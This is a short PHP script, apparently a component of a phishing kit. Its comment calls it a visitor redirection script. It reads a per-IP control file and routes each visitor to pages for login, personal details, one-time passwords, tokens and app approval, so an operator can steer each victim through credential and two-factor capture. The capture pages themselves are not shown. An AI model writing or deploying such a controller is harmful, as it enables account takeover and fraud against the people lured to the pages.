<?php
/**
 * redirect.php - Universal redirection script for visitors
 * This script checks the control file for the visitor's IP and redirects accordingly.
 */

session_start();

function getUserIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    return $_SERVER['REMOTE_ADDR'];
}

$uip = getUserIP();
$control_file = 'users/' . $uip . '.txt';

if (file_exists($control_file)) {
    $data = file_get_contents($control_file);
    if (!empty($data)) {
        $parts = explode('#|#', $data);
        $action = $parts[0];
        $error = isset($parts[1]) ? $parts[1] : 'off';
        
        switch ($action) {
            case 'url':
                $url = isset($parts[2]) ? $parts[2] : 'index.php';
                header("Location: $url");
                exit;
            case 'log':
                header("Location: nkl-log.php?error=$error");
                exit;
            case 'infos':
                header("Location: nkl-infos.php?error=$error");
                exit;
            case 'otp':
                header("Location: nkl-otp.php?error=$error");
                exit;
            case 'token':
                header("Location: nkl-token.php?error=$error");
                exit;
            case 'app':
                header("Location: nkl-app.php?error=$error");
                exit;
            case 'done':
                header("Location: nkl-done.php");
                exit;
        }
    }
}

// Default redirection if no action is set
header("Location: nkl-load.php");
exit;
?>
